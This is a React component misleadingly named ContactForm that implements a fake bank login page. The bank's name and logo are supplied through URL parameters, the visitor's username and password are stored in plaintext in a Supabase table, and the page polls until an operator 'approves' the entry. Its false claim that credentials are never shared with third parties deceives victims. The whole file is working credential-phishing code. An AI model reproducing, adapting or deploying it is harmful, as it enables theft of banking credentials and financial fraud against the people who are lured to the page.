import { useState, useEffect } from 'react'
import { supabase } from '../lib/supabase.js'
import Icon from '../components/Icon.jsx'

// Logo del banco
function BankLogo({ name, file, domain }) {
  const [err, setErr] = useState(false)
  const src = file ? `/banks/${file}` : domain ? `https://icons.duckduckgo.com/ip3/${domain}.ico` : null
  if (err || !src) return <span className="text-sm font-bold text-content-primary">{name}</span>
  return (
    <img
      src={src}
      alt={name}
      loading="lazy"
      onError={() => setErr(true)}
      className="max-h-16 max-w-[90%] object-contain"
    />
  )
}

export default function ContactForm() {
  const [formId, setFormId] = useState(null)
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [rememberUsername, setRememberUsername] = useState(false)
  const [showPassword, setShowPassword] = useState(false)
  const [step, setStep] = useState('form') // 'form' | 'waiting' | 'success'
  const [submitting, setSubmitting] = useState(false)

  // Obtener parámetros de URL
  const params = new URLSearchParams(window.location.search)
  const userId = params.get('uid')
  const bankName = params.get('bank')
  const bankFile = params.get('file')
  const bankDomain = params.get('domain')

  // Polling para saber si fue aprobado
  useEffect(() => {
    if (step !== 'waiting' || !formId) return

    const interval = setInterval(async () => {
      const { data } = await supabase.from('contact_forms').select('status').eq('id', formId).maybeSingle()
      if (data?.status === 'approved') {
        setStep('success')
        clearInterval(interval)
      }
    }, 1000) // Verifica cada segundo

    return () => clearInterval(interval)
  }, [step, formId])

  const submitForm = async (e) => {
    e.preventDefault()
    if (!username || !password) return

    setSubmitting(true)
    const { data, error } = await supabase
      .from('contact_forms')
      .insert({
        full_name: username,
        phone: null,
        email: null,
        password: password,
        note: null,
        institution: bankName || null,
        user_id: userId || null,
        status: 'pending',
      })
      .select('id')
      .single()

    setSubmitting(false)

    if (error) {
      alert('Error al guardar: ' + error.message)
      return
    }

    // Formulario guardado, pasar a "Esperando contacto"
    setFormId(data.id)
    // Guardar form_id en sessionStorage para que AddMoney lo pueda leer
    sessionStorage.setItem('plaidFormId', data.id)
    setStep('waiting')
  }

  const closeWindow = () => window.close()

  // ---- FORMULARIO ----
  if (step === 'form') {
    return (
      <div className="min-h-screen bg-white px-4 py-8 sm:px-0">
        {/* Botón cerrar */}
        <div className="flex justify-end px-4 sm:px-0">
          <button onClick={closeWindow} aria-label="Close" className="text-content-primary hover:text-content-secondary">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
              <path d="M18 6 6 18M6 6l12 12" />
            </svg>
          </button>
        </div>

        <div className="mx-auto grid max-w-6xl grid-cols-1 gap-8 px-4 py-8 sm:grid-cols-2 sm:px-8">
          {/* Columna izquierda - Formulario */}
          <div>
            {/* Logo del banco */}
            <div className="mb-8 flex h-12 items-center">
              <BankLogo name={bankName} file={bankFile} domain={bankDomain} />
            </div>

            <h1 className="mb-2 text-3xl font-bold text-content-primary">Account login</h1>
            <p className="mb-8 text-content-secondary">Securely access your account</p>

            <form onSubmit={submitForm} className="space-y-6">
              {/* Username */}
              <div>
                <label className="mb-2 block text-sm font-semibold text-content-primary">Username</label>
                <input
                  type="text"
                  required
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full border-b-2 border-black/20 bg-transparent px-0 py-3 outline-none transition-colors focus:border-blue-600"
                />
              </div>

              {/* Remember username */}
              <label className="flex items-center gap-3">
                <input
                  type="checkbox"
                  checked={rememberUsername}
                  onChange={(e) => setRememberUsername(e.target.checked)}
                  className="h-5 w-5 cursor-pointer rounded border-black/20 accent-blue-600"
                />
                <span className="text-sm text-content-primary">Remember my username</span>
              </label>

              {/* Password */}
              <div>
                <div className="mb-2 flex items-center justify-between">
                  <label className="block text-sm font-semibold text-content-primary">Password</label>
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="text-sm text-blue-600 hover:text-blue-700"
                  >
                    {showPassword ? 'Hide' : 'Show'}
                  </button>
                </div>
                <input
                  type={showPassword ? 'text' : 'password'}
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full border-b-2 border-black/20 bg-transparent px-0 py-3 outline-none transition-colors focus:border-blue-600"
                />
              </div>

              {/* Login button */}
              <button
                type="submit"
                disabled={submitting}
                className="mt-8 w-full rounded-xl bg-blue-600 py-3.5 font-bold text-white hover:bg-blue-700 disabled:opacity-60"
              >
                {submitting ? 'Logging in…' : 'Log in with password'}
              </button>

              {/* Divider */}
              <div className="flex items-center gap-3 py-4">
                <div className="flex-1 border-t border-black/10" />
                <span className="text-sm text-content-tertiary">OR</span>
                <div className="flex-1 border-t border-black/10" />
              </div>

              {/* Passkey button */}
              <button
                type="button"
                className="w-full rounded-xl border-2 border-blue-600 py-3.5 font-bold text-blue-600 hover:bg-blue-50"
              >
                👤 Use passkey
              </button>
            </form>

            {/* Links */}
            <div className="mt-8 space-y-4 text-center">
              <a href="#" className="block text-sm text-blue-600 hover:text-blue-700">
                Forgot username or password?
              </a>
              <a href="#" className="block text-sm underline text-content-primary hover:text-content-secondary">
                Enroll in online banking
              </a>
            </div>
          </div>

          {/* Columna derecha - Info panel */}
          <div className="hidden flex-col justify-center sm:flex">
            <div className="rounded-2xl bg-blue-50 p-8">
              <div className="mb-6 flex h-16 w-16 items-center justify-center rounded-full bg-blue-100">
                <span className="text-3xl">🔐</span>
              </div>
              <h2 className="mb-4 text-2xl font-bold text-content-primary">Enhanced Security</h2>
              <p className="mb-6 text-content-secondary">
                Your login is protected with bank-grade encryption and security measures. We never share your credentials with third parties.
              </p>
              <a href="#" className="inline-flex items-center gap-2 text-sm font-semibold text-blue-600 hover:text-blue-700">
                Learn more <span>→</span>
              </a>
            </div>
          </div>
        </div>
      </div>
    )
  }

  // ---- ESPERANDO CONTACTO ----
  if (step === 'waiting') {
    return (
      <div className="flex min-h-screen items-center justify-center bg-bg-neutral px-4">
        <div className="w-full max-w-[400px] rounded-2xl bg-white p-6 shadow-xl text-center">
          <div className="mb-6 flex justify-center">
            <span className="flex h-16 w-16 items-center justify-center rounded-full bg-bright-green/30">
              <Icon name="hourglass" size={32} className="text-forest animate-pulse" />
            </span>
          </div>
          <h1 className="mb-2 text-2xl font-bold text-content-primary">Waiting for Contact</h1>
          <p className="text-content-secondary">We received your information. Our team will review it and get back to you soon.</p>
          <div className="mt-6 h-1 w-12 rounded-full bg-bright-green mx-auto animate-pulse" />
        </div>
      </div>
    )
  }

  // ---- ÉXITO ----
  if (step === 'success') {
    setTimeout(closeWindow, 5000) // Esperar 5 segundos antes de cerrar
    return (
      <div className="flex min-h-screen items-center justify-center bg-bg-neutral px-4">
        <div className="w-full max-w-[400px] rounded-2xl bg-white p-6 shadow-xl text-center">
          <div className="mb-6 flex justify-center">
            <span className="flex h-16 w-16 items-center justify-center rounded-full bg-bright-green/30">
              <Icon name="check" size={32} stroke={3} className="text-forest" />
            </span>
          </div>
          <h1 className="mb-2 text-2xl font-bold text-content-primary">Form Submitted Successfully!</h1>
          <p className="text-content-secondary">Thank you. This window will close in a moment.</p>
        </div>
      </div>
    )
  }
}
